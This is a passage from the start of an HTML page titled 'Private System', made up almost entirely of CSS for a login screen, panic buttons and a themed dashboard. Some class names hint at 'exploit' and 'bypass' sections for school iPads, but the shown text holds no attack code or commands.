<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* Global Reset & Base */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }
    
    body {
      margin: 0; padding: 0;
      overflow-x: hidden; /* Prevent horizontal scroll for transitions */
      transition: background-color 0.3s, color 0.3s, zoom 0.3s ease-in-out;
      position: relative; /* For the quick bar positioning on login and welcome notification */
    }

    /* Preloader Styles */
    #preloader {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: #000;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      color: #fff;
    }

    .rotating-cube {
      width: 80px; height: 80px;
      perspective: 800px;
      margin-bottom: 20px;
    }

    .cube {
      width: 100%; height: 100%;
      position: relative;
      transform-style: preserve-3d;
      animation: rotateCube 4s infinite linear;
    }

    .face {
      position: absolute;
      width: 80px; height: 80px;
      background: rgba(255, 255, 255, 0.2);
      border: 2px solid rgba(255, 255, 255, 0.5);
      text-align: center; line-height: 80px; font-size: 20px;
      backface-visibility: hidden;
    }

    .front  { transform: rotateY(0deg) translateZ(40px); }
    .back   { transform: rotateX(180deg) translateZ(40px); }
    .right  { transform: rotateY(90deg) translateZ(40px); }
    .left   { transform: rotateY(-90deg) translateZ(40px); }
    .top    { transform: rotateX(90deg) translateZ(40px); }
    .bottom { transform: rotateX(-90deg) translateZ(40px); }

    @keyframes rotateCube {
      0% { transform: rotateX(0) rotateY(0) rotateZ(0); }
      100% { transform: rotateX(360deg) rotateY(360deg) rotateZ(360deg); }
    }
    @keyframes rotateCubeOut {
      0% { transform: rotateX(360deg) rotateY(360deg) rotateZ(360deg) scale(1); opacity: 1; }
      100% { transform: rotateX(540deg) rotateY(540deg) rotateZ(540deg) scale(0); opacity: 0; }
    }

    #loadingText {
      font-size: 1.8em;
      font-weight: bold;
      transition: color 1s linear; /* Smooth color transition */
    }

    /* Gradient for loading text */
    .gradient-orange-red {
      background-image: linear-gradient(to right, orange, red);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    /* Login System Styles */    
    body.login-body {
      margin: 0; padding: 0;
      background: #000;
      color: #fff;
      display: flex;
      flex-direction: column; /* Allow quick bar on top */
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      box-sizing: border-box; /* Crucial for percentage heights with padding/borders */
      padding-top: 50px; /* Space for the quick bar */
    }

    .login-box {
      background: #000;
      border-radius: 15px; /* Rounded corners */
      border: 3px solid white;
      box-shadow: 0 0 15px white;
      width: 400px; /* More square-like width */
      max-width: 90%; /* Responsive */
      padding: 35px 30px; /* Adjusted padding */
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s;
      transform: scale(0); /* Start hidden for animation */
      opacity: 0;
      animation: loginReveal 1s forwards cubic-bezier(0.2, 0.8, 0.2, 1);
    }

    @keyframes loginReveal {
      0% { transform: scale(0) rotateY(90deg); opacity: 0; }
      100% { transform: scale(1) rotateY(0deg); opacity: 1; }
    }
    
    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }
    
    .login-box h2 {
      font-size: 1.8em;
      margin-bottom: 25px;
      font-family: 'Courier New', monospace;
      color: #fff;
    }
    
    .login-box input {
      width: 100%;
      padding: 14px;
      margin-bottom: 18px;
      background: #1c1c1c;
      border: none;
      color: white;
      border-radius: 10px; /* Slightly more rounded inputs */
      font-size: 1em;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    .login-box input:focus {
      border-color: #ff914d;
      box-shadow: 0 0 8px rgba(255, 145, 77, 0.5);
    }
    
    .toggle-switch-container {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 15px;
      user-select: none;
    }

    .toggle-switch-container label {
      font-size: 1em;
      cursor: pointer;
      color: #ccc;
    }

    /* New Toggle Switch Styles */
    .toggle-switch {
      position: relative;
      display: inline-block;
      width: 50px;
      height: 26px;
    }

    .toggle-switch input {
      opacity: 0;
      width: 0;
      height: 0;
      margin-bottom: 0; /* Override default input margin */
    }

    .slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: #ccc;
      transition: .4s;
      border-radius: 26px;
    }

    .slider:before {
      position: absolute;
      content: "";
      height: 20px;
      width: 20px;
      left: 3px;
      bottom: 3px;
      background-color: white;
      transition: .4s;
      border-radius: 50%;
    }

    input:checked + .slider {
      background-color: #4CAF50; /* Green when toggled on */
    }

    input:checked + .slider:before {
      transform: translateX(24px);
    }
    
    .login-box button {
      width: 100%;
      padding: 13px;
      background-color: #ff4c4c;
      color: white;
      font-size: 1.1em;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.3s, box-shadow 0.3s;
      outline: none;
    }

    .login-box button:hover {
      background-color: #ff1a1a;
      box-shadow: 0 0 10px rgba(255, 76, 76, 0.7);
    }

    .attempt-counter, .error-message {
      margin-top: 15px;
      font-size: 0.9em;
      color: #ff6347; /* Slightly softer red */
      font-weight: bold;
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 25px;
      transform: translate(-50%, -50%);
      background: black;
      border: 3px solid white;
      border-radius: 15px;
      box-shadow: 0 0 20px white;
      z-index: 10;
      animation: fadeIn 0.3s ease-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
      to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
    }
    
    .popup input {
      margin-bottom: 15px;
      padding: 12px;
      border-radius: 8px;
    }

    /* Login Info Box (Date/Time) */
    .login-info-box {
      background: #1c1c1c;
      border-radius: 10px;
      padding: 15px 20px;
      margin-top: 20px;
      border: 1px solid #444;
      display: flex;
      flex-direction: column;
      gap: 10px;
      align-items: center;
      font-size: 0.95em;
      width: 100%; /* Match login box width */
      max-width: 400px;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
    }

    .login-info-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      width: 100%;
    }

    .login-info-row span {
      flex: 1;
      text-align: center;
      padding: 5px;
      border-radius: 5px;
      background: #333;
    }

    .login-info-row .toggle-switch {
      margin-left: 10px;
    }

    /* Login Page Quick Bar */
    .login-quick-bar {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      display: flex;
      justify-content: center;
      gap: 10px;
      padding: 8px 15px;
      background: rgba(0, 0, 0, 0.7);
      border-bottom: 1px solid rgba(255, 255, 255, 0.2);
      z-index: 999;
    }

    .login-quick-bar button {
      background-color: #ff914d;
      border: none;
      padding: 8px 12px;
      border-radius: 6px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      font-size: 0.85em;
    }

    .login-quick-bar button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px);
    }
    #loginPanicBtn { background: #ff4c4c !important; color: white !important; }
    #loginPanicBtn:hover { background: #ff1a1a !important; }

    /* Dashboard Styles */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');

    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: #1a1a1a;
      color: #f9f2dc;
      padding: 20px;
      transition: background-color 0.3s, color 0.3s;
      zoom: 1; 
      position: relative; /* For top-right notifications */
    }

    /* THEMES */
    /* Light Theme */
    body.dashboard-body.light-theme { background-color: #f9f2dc; color: #1a1a1a; }
    body.dashboard-body.light-theme .dashboard-header { background: #ffd966; color: #000; }
    body.dashboard-body.light-theme #buttonsArea button, 
    body.dashboard-body.light-theme .quick-info-buttons button,
    body.dashboard-body.light-theme #buttonsArea .search-container button { background-color: #ffd966; color: #000; }
    body.dashboard-body.light-theme #buttonsArea button:hover, 
    body.dashboard-body.light-theme .quick-info-buttons button:hover,
    body.dashboard-body.light-theme #buttonsArea .search-container button:hover { background-color: #ffe699; }
    body.dashboard-body.light-theme #announcementBar { background-color: #ffd966; color: #000; }
    body.dashboard-body.light-theme .box, body.dashboard-body.light-theme #canvasContainer, 
    body.dashboard-body.light-theme .info-panel, body.dashboard-body.light-theme .settings-panel, 
    body.dashboard-body.light-theme .utility-panel, body.dashboard-body.light-theme .notes-content, 
    body.dashboard-body.light-theme .activity-history-panel, body.dashboard-body.light-theme .keybinds-panel,
    body.dashboard-body.light-theme .login-history-panel, body.dashboard-body.light-theme .reminder-panel,
    body.dashboard-body.light-theme .time-tools-panel, body.dashboard-body.light-theme #buttonsArea { background-color: #e0e0e0; color: #000; box-shadow: 0 0 15px rgba(200, 200, 200, 0.5); border: 1px solid #ccc; }
    body.dashboard-body.light-theme .box h2, body.dashboard-body.light-theme .settings-panel h2, 
    body.dashboard-body.light-theme .utility-panel h2, body.dashboard-body.light-theme .info-panel h2,
    body.dashboard-body.light-theme .activity-history-panel h2, body.dashboard-body.light-theme .keybinds-panel h2,
    body.dashboard-body.light-theme .login-history-panel h2, body.dashboard-body.light-theme .reminder-panel h2,
    body.dashboard-body.light-theme .time-tools-panel h2, body.dashboard-body.light-theme #buttonsArea h2 { color: #555; }
    body.dashboard-body.light-theme .update-entry { background: #ccc; color: #333; }
    body.dashboard-body.light-theme .calendar div { background: #e9e9e9; color: #000; }
    body.dashboard-body.light-theme .today { background: #ffd966 !important; color: #000 !important; }
    body.dashboard-body.light-theme .motivation-box { background-color: #fff3cc; color: #994d00; box-shadow: 0 0 12px rgba(255, 145, 77, 0.8); }
    body.dashboard-body.light-theme .wifi-grid div, body.dashboard-body.light-theme .wifi-entry div:not([class*="level-"]) { background: #d0d0d0; color: #000;}
    body.dashboard-body.light-theme .handbook-buttons button, body.dashboard-body.light-theme .handbook-buttons a, 
    body.dashboard-body.light-theme .links-list a, body.dashboard-body.light-theme .exploit-buttons a,
    body.dashboard-body.light-theme .bypass-buttons button, body.dashboard-body.light-theme .ipad-options button { background-color: #ffd966; color: #000; }
    body.dashboard-body.light-theme .handbook-buttons button:hover, body.dashboard-body.light-theme .handbook-buttons a:hover, 
    body.dashboard-body.light-theme .links-list a:hover, body.dashboard-body.light-theme .exploit-buttons a:hover,
    body.dashboard-body.light-theme .bypass-buttons button:hover, body.dashboard-body.light-theme .ipad-options button:hover { background-color: #ffe699; }
    body.dashboard-body.light-theme .coming-soon, body.dashboard-body.light-theme .info-text, 
    body.dashboard-body.light-theme .school-info-item, body.dashboard-body.light-theme .ipad-content,
    body.dashboard-body.light-theme .bypass-content { background: #d0d0d0; color: #000; }
    body.dashboard-body.light-theme .school-info-label { color: #555; }
    body.dashboard-body.light-theme #notesCanvas { border: 2px solid #555; background: #fff;}
    body.dashboard-body.light-theme #canvasControls button { background-color: #ffd966; color: #000; }
    body.dashboard-body.light-theme #canvasControls button:hover { background-color: #ffe699; }
    body.dashboard-body.light-theme #notesTextPopup { background: #e0e0e0; border-color: #ccc; color: #000; }
    body.dashboard-body.light-theme .settings-option input[type="range"] { background: #ffd966; }
    body.dashboard-body.light-theme #calculator input, body.dashboard-body.light-theme #unitConverter input, 
    body.dashboard-body.light-theme #unitConverter select, body.dashboard-body.light-theme #keybindsPanel input,
    body.dashboard-body.light-theme #reminderPanel input, body.dashboard-body.light-theme .timer-input { background: #d0d0d0; border: 1px solid #aaa; color: #000;}
    body.dashboard-body.light-theme #calculator button, body.dashboard-body.light-theme #unitConverter button { background-color: #ffd966; color: #000;}
    body.dashboard-body.light-theme #calculator button.operator, body.dashboard-body.light-theme #calculator button.equals { background-color: #79addc; color: #fff; }
    body.dashboard-body.light-theme #calculator button.clear { background-color: #f7a59a; color: #fff;}
    body.dashboard-body.light-theme #calculator button:hover, body.dashboard-body.light-theme #unitConverter button:hover { background-color: #ffe699; }
    body.dashboard-body.light-theme .alert { background-color: #fff3cc; border-left: 5px solid #ff914d; color: #1a1a1a; }
    body.dashboard-body.light-theme .stats-entry span, body.dashboard-body.light-theme .activity-log-entry, 
    body.dashboard-body.light-theme .login-history-entry, body.dashboard-body.light-theme .keybinds-entry { background: #d0d0d0; }

    /* Forest Theme */
    body.dashboard-body.forest-theme { background-color: #2e4c3a; color: #e0f2f7; }
    body.dashboard-body.forest-theme .dashboard-header { background: #5c8d89; color: #fff; }
    body.dashboard-body.forest-theme #buttonsArea button, 
    body.dashboard-body.forest-theme .quick-info-buttons button,
    body.dashboard-body.forest-theme #buttonsArea .search-container button { background-color: #74b39b; color: #3d3d3d; }
    body.dashboard-body.forest-theme #buttonsArea button:hover, 
    body.dashboard-body.forest-theme .quick-info-buttons button:hover,
    body.dashboard-body.forest-theme #buttonsArea .search-container button:hover { background-color: #8cceb8; }
    body.dashboard-body.forest-theme #announcementBar { background-color: #74b39b; color: #3d3d3d; }
    body.dashboard-body.forest-theme .box, body.dashboard-body.forest-theme #canvasContainer, 
    body.dashboard-body.forest-theme .info-panel, body.dashboard-body.forest-theme .settings-panel, 
    body.dashboard-body.forest-theme .utility-panel, body.dashboard-body.forest-theme .notes-content, 
    body.dashboard-body.forest-theme .activity-history-panel, body.dashboard-body.forest-theme .keybinds-panel,
    body.dashboard-body.forest-theme .login-history-panel, body.dashboard-body.forest-theme .reminder-panel,
    body.dashboard-body.forest-theme .time-tools-panel, body.dashboard-body.forest-theme #buttonsArea { background-color: #3b5a45; color: #e0f2f7; box-shadow: 0 0 15px rgba(92, 141, 137, 0.4); border: 1px solid #5c8d89; }
    body.dashboard-body.forest-theme .box h2, body.dashboard-body.forest-theme .settings-panel h2, 
    body.dashboard-body.forest-theme .utility-panel h2, body.dashboard-body.forest-theme .info-panel h2,
    body.dashboard-body.forest-theme .activity-history-panel h2, body.dashboard-body.forest-theme .keybinds-panel h2,
    body.dashboard-body.forest-theme .login-history-panel h2, body.dashboard-body.forest-theme .reminder-panel h2,
    body.dashboard-body.forest-theme .time-tools-panel h2, body.dashboard-body.forest-theme #buttonsArea h2 { color: #c5f1db; }
    body.dashboard-body.forest-theme .update-entry { background: #4a6a57; color: #d7ede1; }
    body.dashboard-body.forest-theme .calendar div { background: #5a7b6a; color: #e0f2f7; }
    body.dashboard-body.forest-theme .today { background: #5c8d89 !important; color: #fff !important; }
    body.dashboard-body.forest-theme .motivation-box { background-color: #4a6a57; color: #e0f2f7; box-shadow: 0 0 12px rgba(92, 141, 137, 0.6); }
    body.dashboard-body.forest-theme .wifi-grid div, body.dashboard-body.forest-theme .wifi-entry div:not([class*="level-"]) { background: #4a6a57; color: #e0f2f7; }
    body.dashboard-body.forest-theme .handbook-buttons button, body.dashboard-body.forest-theme .handbook-buttons a,
    body.dashboard-body.forest-theme .links-list a, body.dashboard-body.forest-theme .exploit-buttons a,
    body.dashboard-body.forest-theme .bypass-buttons button, body.dashboard-body.forest-theme .ipad-options button { background-color: #74b39b; color: #3d3d3d; }
    body.dashboard-body.forest-theme .handbook-buttons button:hover, body.dashboard-body.forest-theme .handbook-buttons a:hover,
    body.dashboard-body.forest-theme .links-list a:hover, body.dashboard-body.forest-theme .exploit-buttons a:hover,
    body.dashboard-body.forest-theme .bypass-buttons button:hover, body.dashboard-body.forest-theme .ipad-options button:hover { background-color: #8cceb8; }
    body.dashboard-body.forest-theme .coming-soon, body.dashboard-body.forest-theme .info-text,
    body.dashboard-body.forest-theme .school-info-item, body.dashboard-body.forest-theme .ipad-content,
    body.dashboard-body.forest-theme .bypass-content { background: #4a6a57; color: #e0f2f7; }
    body.dashboard-body.forest-theme .school-info-label { color: #c5f1db; }
    body.dashboard-body.forest-theme #notesCanvas { border: 2px solid #5c8d89; background: #fff;}
    body.dashboard-body.forest-theme #canvasControls button { background-color: #74b39b; color: #3d3d3d; }
    body.dashboard-body.forest-theme #canvasControls button:hover { background-color: #8cceb8; }
    body.dashboard-body.forest-theme #notesTextPopup { background: #3b5a45; border-color: #5c8d89; color: #e0f2f7; }
    body.dashboard-body.forest-theme .settings-option input[type="range"] { background: #74b39b; }
    body.dashboard-body.forest-theme #calculator input, body.dashboard-body.forest-theme #unitConverter input, 
    body.dashboard-body.forest-theme #unitConverter select, body.dashboard-body.forest-theme #keybindsPanel input,
    body.dashboard-body.forest-theme #reminderPanel input, body.dashboard-body.forest-theme .timer-input { background: #4a6a57; border: 1px solid #5c8d89; color: #e0f2f7; }
    body.dashboard-body.forest-theme #calculator button, body.dashboard-body.forest-theme #unitConverter button { background-color: #74b39b; color: #3d3d3d;}
    body.dashboard-body.forest-theme #calculator button.operator, body.dashboard-body.forest-theme #calculator button.equals { background-color: #3b5a45; color: #c5f1db; }
    body.dashboard-body.forest-theme #calculator button.clear { background-color: #a76677; color: #e0f2f7;}
    body.dashboard-body.forest-theme #calculator button:hover, body.dashboard-body.forest-theme #unitConverter button:hover { background-color: #8cceb8; }
    body.dashboard-body.forest-theme .alert { background-color: #4a6a57; border-left: 5px solid #74b39b; color: #e0f2f7; }
    body.dashboard-body.forest-theme .stats-entry span, body.dashboard-body.forest-theme .activity-log-entry, 
    body.dashboard-body.forest-theme .login-history-entry, body.dashboard-body.forest-theme .keybinds-entry { background: #4a6a57; }


    /* Ocean Theme */
    body.dashboard-body.ocean-theme { background-color: #0b1a2a; color: #e0f2f7; }
    body.dashboard-body.ocean-theme .dashboard-header { background: #3b82f6; color: #fff; }
    body.dashboard-body.ocean-theme #buttonsArea button, 
    body.dashboard-body.ocean-theme .quick-info-buttons button,
    body.dashboard-body.ocean-theme #buttonsArea .search-container button { background-color: #2196f3; color: #fff; }
    body.dashboard-body.ocean-theme #buttonsArea button:hover, 
    body.dashboard-body.ocean-theme .quick-info-buttons button:hover,
    body.dashboard-body.ocean-theme #buttonsArea .search-container button:hover { background-color: #64b5f6; }
    body.dashboard-body.ocean-theme #announcementBar { background-color: #2196f3; color: #fff; }
    body.dashboard-body.ocean-theme .box, body.dashboard-body.ocean-theme #canvasContainer, 
    body.dashboard-body.ocean-theme .info-panel, body.dashboard-body.ocean-theme .settings-panel, 
    body.dashboard-body.ocean-theme .utility-panel, body.dashboard-body.ocean-theme .notes-content, 
    body.dashboard-body.ocean-theme .activity-history-panel, body.dashboard-body.ocean-theme .keybinds-panel,
    body.dashboard-body.ocean-theme .login-history-panel, body.dashboard-body.ocean-theme .reminder-panel,
    body.dashboard-body.ocean-theme .time-tools-panel, body.dashboard-body.ocean-theme #buttonsArea { background-color: #1a374d; color: #e0f2f7; box-shadow: 0 0 15px rgba(59, 130, 246, 0.4); border: 1px solid #3b82f6; }
    body.dashboard-body.ocean-theme .box h2, body.dashboard-body.ocean-theme .settings-panel h2, 
    body.dashboard-body.ocean-theme .utility-panel h2, body.dashboard-body.ocean-theme .info-panel h2,
    body.dashboard-body.ocean-theme .activity-history-panel h2, body.dashboard-body.ocean-theme .keybinds-panel h2,
    body.dashboard-body.ocean-theme .login-history-panel h2, body.dashboard-body.ocean-theme .reminder-panel h2,
    body.dashboard-body.ocean-theme .time-tools-panel h2, body.dashboard-body.ocean-theme #buttonsArea h2 { color: #90caf9; }
    body.dashboard-body.ocean-theme .update-entry { background: #264a66; color: #cfe8fc; }
    body.dashboard-body.ocean-theme .calendar div { background: #315e83; color: #e0f2f7; }
    body.dashboard-body.ocean-theme .today { background: #3b82f6 !important; color: #fff !important; }
    body.dashboard-body.ocean-theme .motivation-box { background-color: #264a66; color: #e0f2f7; box-shadow: 0 0 12px rgba(59, 130, 246, 0.6); }
    body.dashboard-body.ocean-theme .wifi-grid div, body.dashboard-body.ocean-theme .wifi-entry div:not([class*="level-"]) { background: #264a66; color: #e0f2f7; }
    body.dashboard-body.ocean-theme .handbook-buttons button, body.dashboard-body.ocean-theme .handbook-buttons a,
    body.dashboard-body.ocean-theme .links-list a, body.dashboard-body.ocean-theme .exploit-buttons a,
    body.dashboard-body.ocean-theme .bypass-buttons button, body.dashboard-body.ocean-theme .ipad-options button { background-color: #2196f3; color: #fff; }
    body.dashboard-body.ocean-theme .handbook-buttons button:hover, body.dashboard-body.ocean-theme .handbook-buttons a:hover,
    body.dashboard-body.ocean-theme .links-list a:hover, body.dashboard-body.ocean-theme .exploit-buttons a:hover,
    body.dashboard-body.ocean-theme .bypass-buttons button:hover, body.dashboard-body.ocean-theme .ipad-options button:hover { background-color: #64b5f6; }
    body.dashboard-body.ocean-theme .coming-soon, body.dashboard-body.ocean-theme .info-text,
    body.dashboard-body.ocean-theme .school-info-item, body.dashboard-body.ocean-theme .ipad-content,
    body.dashboard-body.ocean-theme .bypass-content { background: #264a66; color: #e0f2f7; }
    body.dashboard-body.ocean-theme .school-info-label { color: #90caf9; }
    body.dashboard-body.ocean-theme #notesCanvas { border: 2px solid #3b82f6; background: #fff;}
    body.dashboard-body.ocean-theme #canvasControls button { background-color: #2196f3; color: #fff; }
    body.dashboard-body.ocean-theme #canvasControls button:hover { background-color: #64b5f6; }
    body.dashboard-body.ocean-theme #notesTextPopup { background: #1a374d; border-color: #3b82f6; color: #e0f2f7; }
    body.dashboard-body.ocean-theme .settings-option input[type="range"] { background: #2196f3; }
    body.dashboard-body.ocean-theme #calculator input, body.dashboard-body.ocean-theme #unitConverter input, 
    body.dashboard-body.ocean-theme #unitConverter select, body.dashboard-body.ocean-theme #keybindsPanel input,
    body.dashboard-body.ocean-theme #reminderPanel input, body.dashboard-body.ocean-theme .timer-input { background: #264a66; border: 1px solid #3b82f6; color: #e0f2f7; }
    body.dashboard-body.ocean-theme #calculator button, body.dashboard-body.ocean-theme #unitConverter button { background-color: #2196f3; color: #fff;}
    body.dashboard-body.ocean-theme #calculator button.operator, body.dashboard-body.ocean-theme #calculator button.equals { background-color: #1a374d; color: #90caf9; }
    body.dashboard-body.ocean-theme #calculator button.clear { background-color: #4CAF50; color: #fff;} /* A bit out of theme, could be dark blue */
    body.dashboard-body.ocean-theme #calculator button:hover, body.dashboard-body.ocean-theme #unitConverter button:hover { background-color: #64b5f6; }
    body.dashboard-body.ocean-theme .alert { background-color: #264a66; border-left: 5px solid #2196f3; color: #e0f2f7; }
    body.dashboard-body.ocean-theme .stats-entry span, body.dashboard-body.ocean-theme .activity-log-entry, 
    body.dashboard-body.ocean-theme .login-history-entry, body.dashboard-body.ocean-theme .keybinds-entry { background: #264a66; }


    /* Welcome Notification */
    #welcomeNotification {
      position: absolute;
      top: 20px;
      right: 20px;
      background-color: #28a745;
      color: white;
      padding: 10px 20px;
      border-radius: 8px;
      font-weight: bold;
      z-index: 1000;
      opacity: 0;
      transform: translateX(120%);
      transition: all 0.5s ease-out;
    }

    #welcomeNotification.show {
      opacity: 1;
      transform: translateX(0);
    }
    
    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #ff914d;
      padding: 15px 25px;
      border-radius: 12px;
      color: #000;
      margin-bottom: 20px;
    }

    .dashboard-header h1 {
      font-size: 24px;
      margin: 0;
    }

    .user-info {
      font-weight: bold;
    }

    .version-box {
      background: #ffd966;
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
    }

    /* Consolidated Buttons Area Styling */
    #buttonsArea {
      display: flex;
      flex-wrap: wrap; /* Allow buttons to wrap to new lines */
      justify-content: center;
      gap: 12px;
      margin-top: 0; /* No margin-top if replacing quickbar */
      margin-bottom: 20px;
      background: #2a2a2a;
      padding: 15px 10px; /* Slightly more padding */
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
      position: relative;
      align-items: center; /* Vertically align items like search bar */
      min-height: auto; /* Allow height to adjust */
    }

    #buttonsArea h2 {
        display: none; /* Hide the old 'Quick Actions' header as it's the main bar now */
    }

    #buttonsArea button {
      background-color: #ff914d;
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s; /* Add transform for hover effect */
      min-width: 110px; /* Consistent button width */
      white-space: nowrap;
    }

    #buttonsArea button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px); /* Slight lift on hover */
    }

    #buttonsArea .search-container {
        display: flex;
        gap: 5px;
        flex-grow: 1; /* Allow it to take available space */
        max-width: 400px; /* Wider search bar */
        order: -1; /* Make search bar appear first in the flex container */
        min-width: 250px;
    }
    #buttonsArea .search-container input {
        flex-grow: 1;
        padding: 8px 12px;
        border-radius: 8px;
        border: 1px solid #555;
        background-color: #3a3a3a;
        color: #f9f2dc;
        font-size: 0.9em;
        outline: none;
        transition: border-color 0.2s, box-shadow 0.2s;
    }
    #buttonsArea .search-container input:focus {
        border-color: #ff914d;
        box-shadow: 0 0 5px rgba(255, 145, 77, 0.5);
    }
    #buttonsArea .search-container button {
        min-width: auto;
        padding: 8px 12px;
        flex-shrink: 0; /* Don't let search button shrink */
    }

    /* Style for buttons that open info panels, to make them consistent */
    .quick-info-buttons {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 12px;
      margin-bottom: 20px; /* Ensure spacing after buttons */
    }
    .quick-info-buttons button {
        background-color: #ff914d;
        border: none;
        padding: 10px 14px;
        border-radius: 8px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s, transform 0.1s;
        min-width: 150px; /* A bit wider for text */
        white-space: nowrap;
    }
    .quick-info-buttons button:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
    }

    #panicBtn, #panicBtnDash {
      background: #ff4c4c !important;
      color: white !important;
    }
    #panicBtn:hover, #panicBtnDash:hover {
      background: #ff1a1a !important;
    }


    .announcement-bar {
      width: 100%;
      background-color: #ff914d;
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    .main-row, #updatesNotifications, #additionalPanels { /* Added ID for the new row */
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
      justify-content: center; /* Center boxes */
      align-items: stretch; /* Make boxes fill height in a row */
    }

    .box, #canvasContainer, .info-panel, .settings-panel, .utility-panel, .notes-content, .activity-history-panel, .keybinds-panel, .login-history-panel, .reminder-panel, .time-tools-panel { 
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      min-height: 120px;
      transition: background-color 0.3s, color 0.3s;
      flex: 1 1 calc(33% - 20px); /* Adjust to make them roughly 1/3 width, accounting for gap */
      min-width: 300px; /* Minimum width for responsive layout */
      position: relative; /* For draggable (remains) */
      border: 1px solid transparent; 
      margin-top: 0; /* Reset margin that might be added by info-panel class */
    }
    
    .draggable {
      cursor: grab;
      user-select: none;
    }
    /* Removed .resizer styles */

    .box h2, .settings-panel h2, .utility-panel h2, .info-panel h2, 
    .activity-history-panel h2, .keybinds-panel h2, .login-history-panel h2, 
    .reminder-panel h2, .time-tools-panel h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: #ffbf80;
      cursor: grab; /* Indicating it's draggable by the header */
      padding: 5px; /* Increase clickable area for grab cursor */
      margin-top: 0; /* Ensure H2 sits properly */
    }

    .box p, .box ul {
      font-size: 14px;
    }

    .update-entry {
      background: #40210f;
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: #ffccb3;
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: #333;
      border-radius: 4px;
    }

    .today {
      background: #ff914d !important;
      font-weight: bold;
      color: black;
    }

    #canvasContainer {
      display: none; /* Hide by default */
      margin-top: 20px;
      text-align: center;
    }

    #notesCanvas {
      border: 2px solid #ff914d;
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
      width: 100%; /* Responsive canvas */
      max-width: 600px;
      height: 400px;
      display: block;
      margin: 0 auto 15px auto;
    }

    #canvasControls {
      margin-top: 10px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 8px;
    }

    #canvasControls button {
      background-color: #ff914d;
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    #canvasControls button:hover {
      background-color: #ffb67a;
    }

    #canvasControls input[type="color"],
    #canvasControls input[type="range"] {
      -webkit-appearance: none;
      appearance: none;
      border: none;
      background: #ff914d;
      height: 32px;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.2s;
      padding: 0;
      margin: 0 5px;
    }

    #canvasControls input[type="color"]::-webkit-color-swatch-wrapper { padding: 0; }
    #canvasControls input[type="color"]::-webkit-color-swatch { border: none; border-radius: 8px;}
    #canvasControls input[type="color"]::-moz-color-swatch { border: none; border-radius: 8px;}

    #canvasControls input[type="range"]::-webkit-slider-thumb {
      -webkit-appearance: none;
      appearance: none;
      width: 16px;
      height: 16px;
      background: #fff;
      border-radius: 50%;
      cursor: pointer;
    }
    #canvasControls input[type="range"]::-moz-range-thumb {
      width: 16px;
      height: 16px;
      background: #fff;
      border-radius: 50%;
      cursor: pointer;
    }

    .notes-text-popup {
        display: none;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #2a2a2a;
        border: 2px solid #ff914d;
        border-radius: 10px;
        padding: 20px;
        box-shadow: 0 0 20px rgba(0,0,0,0.5);
        z-index: 1000;
        max-width: 400px;
        width: 90%;
